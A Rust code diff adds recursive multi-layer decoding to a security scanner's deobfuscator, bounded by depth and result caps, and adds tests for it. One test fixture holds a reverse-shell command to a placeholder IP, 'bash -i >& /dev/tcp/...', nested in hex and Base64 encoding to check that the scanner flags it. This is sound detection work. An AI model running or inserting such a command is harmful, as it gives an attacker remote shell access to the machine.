@@ -6,6 +6,14 @@ use std::sync::LazyLock;
 /// Deobfuscation engine for deep scanning
 pub struct Deobfuscator;
 
+/// Maximum number of nested decoding layers to unwrap during a deep scan.
+/// Bounds recursion against stacked/self-referential encodings (issue #128).
+const MAX_DECODE_DEPTH: usize = 4;
+
+/// Maximum number of decoded layers to collect across a single deep scan.
+/// Prevents decode-bomb-style blowups on adversarial input.
+const MAX_DECODE_RESULTS: usize = 256;
+
 static BASE64_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
     // Match both the standard (`+`/`/`) and URL-safe (`-`/`_`) alphabets, with or
     // without `=` padding. A single run may be standard OR URL-safe; `decode_base64`
@@ -29,7 +37,8 @@ impl Deobfuscator {
         Self
     }
 
-    /// Deobfuscate content and return a list of decoded strings
+    /// Deobfuscate content and return a list of decoded strings (single pass,
+    /// suspicious decodes only).
     pub fn deobfuscate(&self, content: &str) -> Vec<DecodedContent> {
         // Early return if no encoded patterns detected
         if !self.has_encoded_patterns(content) {
@@ -50,6 +59,70 @@ impl Deobfuscator {
         .collect()
     }
 
+    /// Single-pass decode of every valid layer, WITHOUT the suspicious filter.
+    ///
+    /// Used by the recursive walker so a non-suspicious intermediate layer can
+    /// still be fed back through the decoders.
+    fn deobfuscate_raw(&self, content: &str) -> Vec<DecodedContent> {
+        if !self.has_encoded_patterns(content) {
+            return Vec::new();
+        }
+
+        vec![
+            self.decode_base64_raw(content),
+            self.decode_hex_raw(content),
+            self.decode_url_raw(content),
+            self.decode_unicode_escapes_raw(content),
+            self.decode_char_code_raw(content),
+        ]
+        .into_par_iter()
+        .flatten()
+        .collect()
+    }
+
+    /// Iteratively decode nested/multi-layer encodings (issue #128).
+    ///
+    /// Each decoded layer is fed back through the decoders up to
+    /// [`MAX_DECODE_DEPTH`] layers. Multi-layer encoding (e.g. Base64 of a
+    /// hex-escaped command) is a standard obfuscation technique that a single
+    /// pass leaves hidden. A visited-set and a [`MAX_DECODE_RESULTS`] cap bound
+    /// the work against decode-bomb / self-referential inputs. Each returned
+    /// layer records its decode chain (e.g. `base64 -> hex`) in `encoding`.
+    fn deobfuscate_recursive(&self, content: &str) -> Vec<DecodedContent> {
+        let mut out = Vec::new();
+        let mut visited: std::collections::HashSet<String> = std::collections::HashSet::new();
+        let mut stack: Vec<(String, String, usize)> = self
+            .deobfuscate_raw(content)
+            .into_iter()
+            .map(|d| (d.decoded, d.encoding, 1usize))
+            .collect();
+
+        while let Some((text, chain, depth)) = stack.pop() {
+            if out.len() >= MAX_DECODE_RESULTS {
+                break;
+            }
+            // Skip layers already seen to avoid loops and redundant work.
+            if !visited.insert(text.clone()) {
+                continue;
+            }
+
+            // Feed this layer back through the decoders before consuming `text`.
+            if depth < MAX_DECODE_DEPTH {
+                for d in self.deobfuscate_raw(&text) {
+                    stack.push((d.decoded, format!("{} -> {}", chain, d.encoding), depth + 1));
+                }
+            }
+
+            out.push(DecodedContent {
+                original: content.chars().take(120).collect(),
+                decoded: text,
+                encoding: chain,
+            });
+        }
+
+        out
+    }
+
     /// Check if content contains encoded patterns
     fn has_encoded_patterns(&self, content: &str) -> bool {
         // Use regex patterns for more accurate detection
@@ -60,8 +133,26 @@ impl Deobfuscator {
             || CHAR_CODE_PATTERN.is_match(content)
     }
 
-    /// Decode base64 encoded strings
+    /// Keep only the decoded layers whose content looks suspicious.
+    ///
+    /// The public `decode_*` methods apply this so a single pass does not surface
+    /// benign decodes. The recursive walker instead works on the unfiltered
+    /// `decode_*_raw` output so a non-suspicious *intermediate* layer (e.g. a
+    /// hex-escaped string) is still fed back through the decoders (issue #128).
+    fn filter_suspicious(&self, items: Vec<DecodedContent>) -> Vec<DecodedContent> {
+        items
+            .into_iter()
+            .filter(|d| self.is_suspicious(&d.decoded))
+            .collect()
+    }
+
+    /// Decode base64 encoded strings (only suspicious decodes).
     fn decode_base64(&self, content: &str) -> Vec<DecodedContent> {
+        self.filter_suspicious(self.decode_base64_raw(content))
+    }
+
+    /// Decode every valid-UTF-8 base64 run, without the suspicious filter.
+    fn decode_base64_raw(&self, content: &str) -> Vec<DecodedContent> {
         let mut results = Vec::new();
 
         for cap in BASE64_PATTERN.find_iter(content) {
@@ -71,9 +162,7 @@ impl Deobfuscator {
                 continue;
             }
 
-            if let Some(decoded_str) = Self::try_decode_base64_variants(encoded)
-                && self.is_suspicious(&decoded_str)
-            {
+            if let Some(decoded_str) = Self::try_decode_base64_variants(encoded) {
                 results.push(DecodedContent {
                     original: encoded.to_string(),
                     decoded: decoded_str,
@@ -106,8 +195,13 @@ impl Deobfuscator {
             .find_map(|bytes| String::from_utf8(bytes).ok())
     }
 
-    /// Decode hex encoded strings (\\x or 0x format)
+    /// Decode hex encoded strings (only suspicious decodes).
     fn decode_hex(&self, content: &str) -> Vec<DecodedContent> {
+        self.filter_suspicious(self.decode_hex_raw(content))
+    }
+
+    /// Decode every valid-UTF-8 hex run (\\x or 0x format), unfiltered.
+    fn decode_hex_raw(&self, content: &str) -> Vec<DecodedContent> {
         let mut results = Vec::new();
 
         for cap in HEX_PATTERN.find_iter(content) {
@@ -129,9 +223,7 @@ impl Deobfuscator {
                     .collect()
             };
 
-            if let Ok(decoded_str) = String::from_utf8(hex_bytes)
-                && self.is_suspicious(&decoded_str)
-            {
+            if let Ok(decoded_str) = String::from_utf8(hex_bytes) {
                 results.push(DecodedContent {
                     original: encoded.to_string(),
                     decoded: decoded_str,
@@ -143,8 +235,13 @@ impl Deobfuscator {
         results
     }
 
-    /// Decode URL encoded strings
+    /// Decode URL encoded strings (only suspicious decodes).
     fn decode_url(&self, content: &str) -> Vec<DecodedContent> {
+        self.filter_suspicious(self.decode_url_raw(content))
+    }
+
+    /// Decode every valid-UTF-8 URL-encoded run, unfiltered.
+    fn decode_url_raw(&self, content: &str) -> Vec<DecodedContent> {
         let mut results = Vec::new();
 
         for cap in URL_ENCODED_PATTERN.find_iter(content) {
@@ -165,9 +262,7 @@ impl Deobfuscator {
                 }
             }
 
-            if let Ok(decoded_str) = String::from_utf8(decoded_bytes)
-                && self.is_suspicious(&decoded_str)
-            {
+            if let Ok(decoded_str) = String::from_utf8(decoded_bytes) {
                 results.push(DecodedContent {
                     original: encoded.to_string(),
                     decoded: decoded_str,
@@ -179,8 +274,13 @@ impl Deobfuscator {
         results
     }
 
-    /// Decode unicode escape sequences (\\uXXXX)
+    /// Decode unicode escape sequences (only suspicious decodes).
     fn decode_unicode_escapes(&self, content: &str) -> Vec<DecodedContent> {
+        self.filter_suspicious(self.decode_unicode_escapes_raw(content))
+    }
+
+    /// Decode every unicode-escape run (\\uXXXX), unfiltered.
+    fn decode_unicode_escapes_raw(&self, content: &str) -> Vec<DecodedContent> {
         let mut results = Vec::new();
 
         for cap in UNICODE_ESCAPE_PATTERN.find_iter(content) {
@@ -202,20 +302,23 @@ impl Deobfuscator {
                 }
             }
 
-            if self.is_suspicious(&decoded) {
-                results.push(DecodedContent {
-                    original: encoded.to_string(),
-                    decoded,
-                    encoding: "unicode".to_string(),
-                });
-            }
+            results.push(DecodedContent {
+                original: encoded.to_string(),
+                decoded,
+                encoding: "unicode".to_string(),
+            });
         }
 
         results
     }
 
-    /// Decode JavaScript String.fromCharCode patterns
+    /// Decode JavaScript String.fromCharCode patterns (only suspicious decodes).
     fn decode_char_code(&self, content: &str) -> Vec<DecodedContent> {
+        self.filter_suspicious(self.decode_char_code_raw(content))
+    }
+
+    /// Decode every String.fromCharCode run, unfiltered.
+    fn decode_char_code_raw(&self, content: &str) -> Vec<DecodedContent> {
         let mut results = Vec::new();
 
         for cap in CHAR_CODE_PATTERN.find_iter(content) {
@@ -230,13 +333,11 @@ impl Deobfuscator {
 
             let decoded: String = numbers.iter().filter_map(|&n| char::from_u32(n)).collect();
 
-            if self.is_suspicious(&decoded) {
-                results.push(DecodedContent {
-                    original: encoded.to_string(),
-                    decoded,
-                    encoding: "charcode".to_string(),
-                });
-            }
+            results.push(DecodedContent {
+                original: encoded.to_string(),
+                decoded,
+                encoding: "charcode".to_string(),
+            });
         }
 
         results
@@ -291,8 +392,9 @@ impl Deobfuscator {
         // First scan original content
         findings.extend(config.check_content(content, file_path));
 
-        // Then scan decoded content
-        for decoded in self.deobfuscate(content) {
+        // Then scan every decoded layer, unwrapping nested encodings so a
+        // multi-layer payload cannot hide behind one decoding pass (issue #128).
+        for decoded in self.deobfuscate_recursive(content) {
             let context = format!("{}:decoded:{}", file_path, decoded.encoding);
 
             // Create findings for deobfuscated content
@@ -434,6 +536,37 @@ mod tests {
             findings
                 .iter()
                 .any(|f| f.id == "OB-DEEP-001" || f.message.contains("Decoded"))
+        );
+    }
+
+    #[test]
+    fn test_deep_scan_multi_layer_base64_of_hex() {
+        // Multi-layer obfuscation: a reverse-shell command is hex-escaped, then
+        // the hex-escaped string is Base64-encoded. A single decoding pass only
+        // reveals the (non-suspicious) hex-escaped layer; the real command stays
+        // hidden. Deep scan must iterate layers (issue #128).
+        let deob = Deobfuscator::new();
+        let cmd = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1";
+        let hex_escaped: String = cmd.bytes().map(|b| format!("\\x{:02x}", b)).collect();
+        let outer = base64::engine::general_purpose::STANDARD.encode(hex_escaped.as_bytes());
+        let content = format!("echo {} | sh", outer);
+
+        let findings = deob.deep_scan(&content, "payload.sh");
+        assert!(
+            findings.iter().any(|f| f.id == "OB-DEEP-001"),
+            "nested base64(hex(command)) must be decoded and flagged"
+        );
+    }
+
+    #[test]
+    fn test_deep_scan_single_layer_still_benign() {
+        // A plain, non-encoded benign line must not produce deep-scan findings
+        // even with recursive decoding enabled.
+        let deob = Deobfuscator::new();
+        let findings = deob.deep_scan("echo hello world", "safe.sh");
+        assert!(
+            !findings.iter().any(|f| f.id == "OB-DEEP-001"),
+            "benign content must not be flagged"
         );
     }
 
